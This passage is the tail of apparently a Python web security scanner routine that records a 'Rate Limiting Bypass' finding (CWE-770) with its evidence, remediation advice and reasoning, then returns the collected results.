                        title="Rate Limiting Bypass",
                        description="Rate limiting may be bypassable",
                        original_request_id=request.id,
                        url=request.url,
                        method=request.method,
                        payload=str(bypass),
                        evidence="5 rapid requests succeeded",
                        remediation="Implement robust rate limiting.",
                        cwe_id="CWE-770",
                        reasoning="No rate limiting detected",
                        is_post_login=is_post_login
                    )
                    self.results.append(result)
                    return self.results
        
        return self.results
